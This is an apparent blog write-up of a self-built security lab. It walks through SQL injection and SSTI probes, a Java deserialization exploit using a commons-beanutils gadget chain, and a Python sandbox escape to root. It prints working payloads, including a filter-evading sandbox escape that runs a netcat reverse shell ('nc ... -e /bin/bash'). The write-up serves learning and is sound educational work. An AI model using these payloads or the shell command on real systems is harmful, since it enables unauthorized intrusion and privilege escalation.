---
title: "[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)"
date: 2022-02-24T18:17:00+07:00
draft: false
categories: [
    "Offensive Security",
    "Lab"
]
tags: [
    "Java", "Privilege Escalation", "Python"
]
---

### Overview
Address: 10.14.140.127\
This Lab was created for myself and everyone in my teamtontac to research and learn about security vulnerabilities and develop ourselves.
- 1 – Exploit the Java Deserialization vulnerability on port 8081 to get the datmom shell
- 2 – From datmom, escape the python sandbox to escalate to root.

There are also some other services that act as rabbit holes (SQLInjection, SSTI).
### Rabbit hole
Using a quick nmap scan we can see the service ports open on the server:
![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg)

**Port 80**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg)

A web application running on port 80 lets us search for CMC Infosec employee information based on a user id entered by the user:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg)

We can easily detect that the website is affected by a SQL Injection vulnerability just by inserting a quote (') to break the SQL query:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg)

Since this is a function that searches for user information based on the user id entered by the user. We can infer the SQL query might be as follows: \
```SELECT id, full_name FROM users WHERE id LIKE '$id'```

Proceed to dump all users ( ```' or 1=1 -- -``` ):

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg)

Using Sqlmap to dump all DBs:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg)

Dump DB cmc_db:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/7.jpg)

Dump DB secret:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg)

There's nothing special or exploitable in the DB

Extract the DBMS version: ```1' union select null,@@version -- -```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg)

We can't use union combined with into outfile to get a shell because the webroot has been customized and the user also doesn't have write permission to the webroot directory.

**Port 9090**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/10.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg)

Checking the source code we learn that the service running on this port is cockpit.

https://github.com/cockpit-project/cockpit 

It's just a management GUI for managing the OS -> no exploitation potential

**Port 9988**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg)

This is a custom service called CMC memcat. The source code provided beforehand is available at:

http://10.14.140.127/memcat_server.py

We see the service works like a STACK that allows PUSH, POP and DELETE of data.

It displays data to the user using **.format** (a built-in Python template)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg)

So this could be affected by an SSTI (Server Side Template Injection) vulnerability. It can be exploited when we control the frame of the data output.

We see that here most of the output is hard-coded and can't be exploited:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg)

Looking carefully at the DELETE feature with len(parsed_data) equal to 3 we see:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg)

Here we can control ```{val.value}``` which is the value we PUSHed in earlier. When len(parsed_data) is 3 the service will print that value to show the details of the key to delete:

Payload: ```{val.__init__.__globals__}``` (shows all the global variables)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg)

We have a hint: "Thank for your efforts!\nPort 8081 is the only way!\n"

In reality we also can't exploit it to run an arbitrary command on the server because .format in python doesn't allow calling other functions. 

### Foothold with Java deserialization
#### Recon
When accessing the server on port 8081. By default the server lets us download a file:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg)

With the content:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg)

From the Content-Disposition header we can see that the file name is the file path: ```logs/info/info.2021-08-22.log```

The server returns a logname error:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg)

At this point we can try changing the logname:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg)

Changing the logname still returns an error, but we can see that the changed file name really is the log file name, so it may be split by date -> we replace it with this year, month and today's day.

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg)

We see the log file is read successfully. From the file's content, we can see that the web uses springboot, and the corresponding jar package name is **cb-0.0.1- SNAPSHOT.jar**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg)

Try downloading the jar file:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg)

Successfully downloaded the jar file -> Decompile to view the source

Here using JadX

Main handler:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg)

Here we find a hidden API that allows deserializing a User from a user-submitted request encoded in base64 using the **readObject()** function

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg)

API endpoint:  **/bZdWASYu4nN3obRiLpqKCeS8erTZrdxx/parseUser**

This lets us take advantage of it to exploit the Java Deserialization vulnerability
#### Exploit
The **pom.xml** file is where everything related to the project configured through maven is declared, such as declaring the dependencies, the project version, the project name, the repository … 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg)

From pom.xml we learn the project uses the **commons-beanutils 1.8.2** library

This is a library containing a gadget chain that can lead to arbitrary code execution on the server through the previously discovered Java Deserialization vulnerability.

Ysoserial is a famous set of tools that lets us generate Java Deserialization payloads automatically.

https://github.com/frohoff/ysoserial 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg)

Here Ysoserial includes a payload related to the commons-beanutils library. But looking more closely at the code ysoserial uses to generate the payload for this library, we see: 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg)

Besides using commons-beanutils, the payload ysoserial creates also needs **commons-collections** and **commons-logging** to complete the chain. But the project doesn't have these 2 additional dependencies.

So we can't use this tool to create a payload for RCE on the server. We can only write our own payload-generation code using only commons-beanutils and java's standard libraries to create a payload for RCE on the server.

As analyzed in detail in the post : https://tranquac.com/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/ 

The gadget chain in this library is as follows: 

```java
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    BeanComparator.compare()
                        TemplatesImpl.getOutputProperties()
                            TemplatesImpl.newTransformer()
                                TemplatesImpl.getTransletInstance()
                                    TemplatesImpl.defineTransletClasses()
                                        TemplatesImpl.TransletClassLoader.defineClass()
                                            Pwner*(Javassist-generated).<static init>
                                                Runtime.exec()
```

As analyzed in the post: 

PropertyUtils.getProperty(o1, property) : when o1 passed in is a TemplatesImpl object and property has the value outputProperties, the getter method will be called automatically to execute the TemplatesImpl#getOutputProperties() method. Internally, TemplatesImpl#getOutputProperties() in turn calls newTransformer(). And TemplatesImpl#newTransformer() is commonly used to execute malicious bytecodes. Our task is to create malicious bytecode that gives RCE on the server to pass into the TemplatesImpl object to complete the chain

Create a TemplatesImpl object that executes the malicious bytecode: 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg)

TargetByteCodes is exactly the malicious bytecode created by:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg)

Create a class from the String command passed in -> convert that class into the corresponding byte array type to pass into TemplatesImpl

Then call the getPayload function to create the payload -> Encode it in base64 to send to the server

Replace + with “%2b” to avoid character errors when processed on the server:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg)

After running we get the payload:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg)

=> Send request:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg)

We can also use another approach. Since the application uses spring boot. We'll create a **SpringEcho** class whose job is to receive a **cmd Header** on each request. Execute that **cmd** and return the response. This way each time we run a different command we won't need to regenerate the payload:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg)

References:

https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md

https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java 

Full source for reference at: http://103.81.86.132/source.rar 

### Datmom to root with Python escape sandbox
After getting the datmom user's shell. Using sudo -l we see the datmom user can run 2 commands with root privileges 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg)

The first command can't be abused for privilege escalation

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg)

Because getting a shell requires waiting a very long time, and there's no input or untrusted data that can be abused

The 2nd command lets us open a python sandbox under root privileges

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg)

The goal is, from the sandbox, how can we execute an os command to get a root shell.

The content of es2.py

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg)

Here. The sandbox has removed all the funcs and libs we could abuse to call OS commands: import, exec, eval, os …

If our command doesn't contain these keywords it will be executed. Otherwise it gives a warning:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg)

So how can we execute an os command from this sandbox?

When we can't import modules, or the modules we want to import are forbidden. 

A similar idea to when we exploit the SSTI vulnerability. It's known that every object in python has hidden properties and methods. Can we, from these hidden properties or methods, do something big?

For example, a payload to escape this sandbox:

```print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('nc 127.0.0.1 4444 -e /bin/bash'))```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg)

Let's dig a bit deeper to better understand how this payload works:

When doing SSTI I usually pay attention to the __init__ method when it appears, it's an interesting method, and from it we can often do something interesting such as: printing all the globals variables, RCE …

() is known as the way to declare a tuple in python

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg)

Using dir to view all the hidden properties or methods of a tuple

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg)

```.__class__``` ( is a reference to the type of the current instance)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg)

Persistently searching by using dump or looking for a payload that was found before. We can see ```__init__``` appears at:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg)

Continuing deeper into ```__init__``` we'll find a path that lets us reach the os lib by using ```func_globals['linecache']``` found in ```__init__```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg)

YES. But to avoid the **os** keyword which is forbidden. We'll call it by concatenating the 2 strings “o” and “s”. In os we then call “system” and now we can run arbitrary os commands.

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg)

There are many other payloads that can also help us reach the final goal. You can research and analyze more to understand it better.

Thanks for reading this far!





